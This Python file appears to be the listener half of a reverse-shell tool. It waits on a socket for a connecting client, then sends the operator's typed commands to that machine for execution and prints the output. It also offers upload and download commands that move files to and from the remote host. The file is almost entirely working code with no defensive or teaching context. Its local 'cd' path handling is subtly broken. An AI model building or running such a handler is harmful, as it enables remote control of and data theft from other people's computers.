# server

import socket
import os
import traceback
import subprocess


def start_server(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)
    print(f'Listening on {port}...')

    client, addr = server.accept()
    print(f'Connection established: {addr[0]}:{addr[1]}')

    shell_session(client, addr, server)


def send_file(filename, client):
    chunk_size = 4096

    with open(filename, 'rb') as f:
        while chunk := f.read(chunk_size):
            client.sendall(chunk)
        client.shutdown(socket.SHUT_WR)


def recv_file(filename, client):
    chunk_size = 4096

    with open(filename, 'wb') as f:
        while chunk := client.recv(chunk_size):
            f.write(chunk)


def shell_session(client, addr, server):

    exit_list = ['exit', 'break', 'close', 'bye', 'quit']

    try:
        while True:
            # command input
            command = input(f'{addr[0]}\033[1m*\033[32m>_\033[m: ').strip()
            if command.lower() in exit_list:
                client.send(command.lower().encode())
                break
            elif not command:
                pass

            # use "!" for local commands
            elif command.startswith('!'):
                local_command = command[1:].strip()

                # handles "cd" separately
                if local_command.startswith('cd'):
                    path = local_command[:3].strip()
                    try:
                        os.chdir(path)
                        print(f'Changed local directory to: {os.getcwd()}')
                    except FileNotFoundError:
                        print(f'Error: No such directory: "{path}"')
                    except PermissionError:
                        print(f'Error: Permission denied: "{path}"')
                    except NotADirectoryError:
                        print(f'Error: Not a directory: "{path}"')
                else:
                    subprocess.run(local_command, shell=True)
            elif command.startswith('upload'):
                filename = command[7:]
                send_file(filename, client)
            elif command.startswith('download'):
                filename = command[9:]
                recv_file(filename, client)
            else:
               client.send(command.encode())
               output = client.recv(1024).decode()
               if output == 'no output!' or output == 'chdir':
                   pass
               else:
                    print(output)
    except Exception as e :
        print(f'Error: {e}')
        print(traceback.format_exc())
    finally:
        server.close()


def main():
    host = '127.0.0.1'
    port = 8080

    start_server(host, port)


if __name__ == '__main__':
    main()

